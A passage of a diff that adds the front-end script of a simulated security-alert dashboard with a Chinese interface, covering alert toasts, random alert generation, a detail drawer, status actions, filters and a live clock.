+  return d.toLocaleString('zh-CN', { month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit' });
+}
+
+// ===== 统计更新 =====
+function updateStats() {
+  const open = alerts.filter(a => a.status === 'open').length;
+  const ack = alerts.filter(a => a.status === 'acknowledged').length;
+  const resolved = alerts.filter(a => a.status === 'resolved').length;
+  const today = alerts.filter(a => {
+    const d = new Date(a.time);
+    const now = new Date();
+    return d.toDateString() === now.toDateString();
+  }).length;
+  const hourly = alerts.filter(a => {
+    const d = new Date(a.time);
+    return (Date.now() - d.getTime()) < 3600000;
+  }).length;
+
+  document.getElementById('statOpen').textContent = open;
+  document.getElementById('statToday').textContent = today;
+  document.getElementById('statHourly').textContent = hourly;
+  document.getElementById('statAck').textContent = ack + resolved;
+  document.getElementById('sidebarTotal').textContent = alerts.length;
+  document.getElementById('headerBadge').textContent = open;
+  document.getElementById('totalGenerated').textContent = totalGenerated;
+}
+
+// ===== 弹窗 =====
+function showToast(alert) {
+  const container = document.getElementById('floatingAlert');
+  const icons = { critical: '🔴', high: '🟡', medium: '🔵', low: '⚪' };
+  const toast = document.createElement('div');
+  toast.className = `toast ${alert.severity}`;
+  toast.innerHTML = `
+    <span class="toast-icon">${icons[alert.severity] || '⚪'}</span>
+    <div class="toast-body">
+      <div class="toast-title">[${severityLabel(alert.severity)}] ${alert.host} · ${alert.title}</div>
+      <div class="toast-desc">${alert.detail}</div>
+      <div class="toast-time">刚刚</div>
+    </div>
+    <span class="toast-close" onclick="this.parentElement.remove()">✕</span>
+  `;
+  container.appendChild(toast);
+  
+  // 声音动画
+  document.getElementById('soundWave').classList.add('active');
+  setTimeout(() => document.getElementById('soundWave').classList.remove('active'), 1000);
+
+  // 5s 后自动缩小为图标（模拟）
+  setTimeout(() => {
+    toast.style.transition = 'all 0.5s ease';
+    toast.style.transform = 'scale(0.8)';
+    toast.style.opacity = '0';
+    setTimeout(() => toast.remove(), 500);
+  }, 5000);
+  
+  // 最多保留 3 条
+  while (container.children.length > 3) {
+    container.firstChild.remove();
+  }
+}
+
+// ===== 模拟告警 =====
+function simulateAlert() {
+  const tpl = alertTemplates[Math.floor(Math.random() * alertTemplates.length)];
+  const host = tpl.host === 'WEB-SRV-01' ? hosts[0] : tpl.host === 'DB-SRV-02' ? hosts[1] : tpl.host === 'TEST-PC-001' ? hosts[2] : tpl.host === 'FILE-SRV-01' ? hosts[4] : hosts[5];
+  
+  const newAlert = {
+    id: ++alertId,
+    severity: tpl.severity,
+    title: tpl.title,
+    detail: tpl.detail,
+    rule: tpl.rule,
+    host: host.name,
+    ip: host.ip,
+    count: 1,
+    status: 'open',
+    time: new Date().toISOString(),
+  };
+  
+  alerts.unshift(newAlert);
+  totalGenerated++;
+  
+  showToast(newAlert);
+  updateStats();
+  renderAlerts();
+  
+  document.getElementById('lastEventTime').textContent = '刚刚';
+  
+  // 闪烁导航 badge
+  const badge = document.getElementById('headerBadge');
+  badge.style.transition = 'transform 0.1s';
+  badge.style.transform = 'scale(1.3)';
+  setTimeout(() => badge.style.transform = 'scale(1)', 200);
+}
+
+function simulateBurst() {
+  for (let i = 0; i < 5; i++) {
+    setTimeout(() => simulateAlert(), i * 800);
+  }
+}
+
+// ===== 抽屉 =====
+function openDrawer(id) {
+  const alert = alerts.find(a => a.id === id);
+  if (!alert) return;
+  const detail = detailMessages[alert.rule] || { desc: '详细上下文信息待加载。', mitre: 'T1078', suggestion: '1. 查看进程树\n2. 检查关联事件\n3. 确认告警有效性' };
+  
+  document.getElementById('drawerTitle').textContent = `🔍 ${alert.title}`;
+  document.getElementById('drawerBody').innerHTML = `
+    <div class="drawer-section">
+      <div class="d-label">严重度</div>
+      <div class="d-value"><span class="severity-badge sev-${alert.severity}"><span class="severity-dot sdot-${alert.severity}"></span> ${severityLabel(alert.severity)}</span></div>
+    </div>
+    <div class="drawer-section">
+      <div class="d-label">告警详情</div>
+      <div class="d-detail">${detail.desc}</div>
+    </div>
+    <div class="drawer-divider"></div>
+    <div class="drawer-section">
+      <div class="d-label">主机信息</div>
+      <div class="d-value">${alert.host} · ${alert.ip}</div>
+    </div>
+    <div class="drawer-section">
+      <div class="d-label">命中规则</div>
+      <div class="d-value">${alert.rule}</div>
+    </div>
+    <div class="drawer-section">
+      <div class="d-label">触发详情</div>
+      <div class="d-detail" style="font-family:monospace;background:#f9fafb;padding:8px 12px;border-radius:6px;font-size:12px;">${alert.detail}</div>
+    </div>
+    <div class="drawer-section">
+      <div class="d-label">MITRE ATT&CK</div>
+      <div class="d-value">${detail.mitre}</div>
+    </div>
+    <div class="drawer-divider"></div>
+    <div class="drawer-section">
+      <div class="d-label">处置建议</div>
+      <div class="d-detail" style="white-space:pre-line;">${detail.suggestion}</div>
+    </div>
+  `;
+  
+  document.getElementById('drawerOverlay').classList.add('open');
+  document.getElementById('drawer').classList.add('open');
+}
+
+function closeDrawer() {
+  document.getElementById('drawerOverlay').classList.remove('open');
+  document.getElementById('drawer').classList.remove('open');
+}
+
+// ===== 操作 =====
+function ackAlert(id) {
+  const a = alerts.find(x => x.id === id);
+  if (a) { a.status = 'acknowledged'; updateStats(); renderAlerts(); }
+}
+function resolveAlert(id) {
+  const a = alerts.find(x => x.id === id);
+  if (a) { a.status = 'resolved'; updateStats(); renderAlerts(); }
+}
+function dismissAlert(id) {
+  alerts = alerts.filter(x => x.id !== id);
+  selectedAlerts.delete(id);
+  updateStats(); renderAlerts();
+}
+function toggleSelect(id) {
+  if (selectedAlerts.has(id)) selectedAlerts.delete(id);
+  else selectedAlerts.add(id);
+}
+function toggleAll(cb) {
+  let filtered = alerts.filter(a => {
+    if (currentFilter !== 'all' && a.severity !== currentFilter) return false;
+    if (currentStatusFilter !== 'all' && a.status !== currentStatusFilter) return false;
+    return true;
+  });
+  if (cb.checked) filtered.forEach(a => selectedAlerts.add(a.id));
+  else selectedAlerts.clear();
+  renderAlerts();
+}
+function batchAck() {
+  alerts.forEach(a => { if (selectedAlerts.has(a.id)) a.status = 'acknowledged'; });
+  selectedAlerts.clear(); updateStats(); renderAlerts();
+}
+function batchResolve() {
+  alerts.forEach(a => { if (selectedAlerts.has(a.id)) a.status = 'resolved'; });
+  selectedAlerts.clear(); updateStats(); renderAlerts();
+}
+function setFilter(el, sev) {
+  document.querySelectorAll('.filter-group:first-child .filter-pill').forEach(x => x.classList.remove('active'));
+  el.classList.add('active');
+  currentFilter = sev; renderAlerts();
+}
+function setStatusFilter(el, status) {
+  document.querySelectorAll('.filter-group:nth-child(2) .filter-pill').forEach(x => x.classList.remove('active'));
+  el.classList.add('active');
+  currentStatusFilter = status; renderAlerts();
+}
+function filterAlerts(q) {
+  searchQuery = q; renderAlerts();
+}
+
+// ===== 时钟 =====
+function updateClock() {
+  document.getElementById('liveTime').textContent = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
+}
+
+// ===== 初始化 =====
+generateAlerts();
+renderHosts();
+renderAlerts();
+updateStats();
+updateClock();
+setInterval(updateClock, 1000);
+
+// 自动模拟（每 15s 随机来一条）
+setInterval(() => {
+  if (Math.random() > 0.5) simulateAlert();
+}, 15000);
+</script>
+</body>
+</html>
